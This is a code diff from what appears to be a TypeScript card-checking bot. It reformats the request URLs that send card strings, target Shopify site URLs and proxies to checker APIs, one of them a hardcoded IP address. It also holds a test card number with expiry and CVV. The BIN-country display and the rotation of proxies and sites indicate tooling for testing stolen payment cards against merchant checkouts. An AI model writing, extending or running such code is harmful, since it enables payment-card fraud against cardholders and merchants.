@@ -5559,8 +5559,8 @@ Admin needs to add sites via Health Check.
           // Helper: single API call
           const callShopifyOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
             const apiUrl = proxy
-              ? `${SHOPIFY_API_URL}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${encodeURIComponent(proxy)}`
-              : `${SHOPIFY_API_URL}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}`;
+              ? `${SHOPIFY_API_URL}?${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${encodeURIComponent(proxy)}`
+              : `${SHOPIFY_API_URL}?${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}`;
             const controller = new AbortController();
             const timeout = setTimeout(() => controller.abort(), 55000);
             try {
@@ -5962,8 +5962,8 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
         // Single call helper
         const mshCallOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
           const apiUrl = proxy
-            ? `${SHOPIFY_API_URL_MSH}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${encodeURIComponent(proxy)}`
-            : `${SHOPIFY_API_URL_MSH}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}`;
+            ? `${SHOPIFY_API_URL_MSH}?${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${encodeURIComponent(proxy)}`
+            : `${SHOPIFY_API_URL_MSH}?${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}`;
           const controller = new AbortController();
           const timeout = setTimeout(() => controller.abort(), 45000);
           try {
@@ -6427,15 +6427,13 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
            return result;
          };
 
-         // Single API call — exact match of web callApiOnce
-          const mtxtBuildApiUrl = (cardCC: string, siteUrl: string, proxy: string) => {
-            // Query param format: domain/?cc={cc}&url={site}&proxy={proxy}
-            const params = new URLSearchParams();
-            params.set("cc", cardCC.trim());
-            params.set("url", siteUrl.trim());
-            if (proxy?.trim()) params.set("proxy", proxy.trim());
-            return `${SHOPIFY_API_URL_MTXT}?${params.toString()}`;
-          };
+          // Single API call — raw format: domain/?{cc}&url={site}&proxy={proxy}
+           const mtxtBuildApiUrl = (cardCC: string, siteUrl: string, proxy: string) => {
+             const cc = encodeURIComponent(cardCC.trim());
+             const site = encodeURIComponent(siteUrl.trim());
+             const proxyPart = proxy?.trim() ? `&proxy=${encodeURIComponent(proxy.trim())}` : "";
+             return `${SHOPIFY_API_URL_MTXT}?${cc}&url=${site}${proxyPart}`;
+           };
 
           const mtxtCallOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
             const apiUrl = mtxtBuildApiUrl(cardCC, siteUrl, proxy);
@@ -9918,8 +9916,8 @@ ${resultsDisplay || "Waiting for results..."}
       const API_ENDPOINTS = [
         (site: string, cc: string, proxy: string) =>
           proxy
-            ? `http://148.230.102.178:8081/?cc=${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`
-            : `http://148.230.102.178:8081/?cc=${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}`,
+            ? `http://148.230.102.178:8081/?${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`
+            : `http://148.230.102.178:8081/?${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}`,
       ];
       const TEST_CC = "4266841674104656|03|27|908";
 
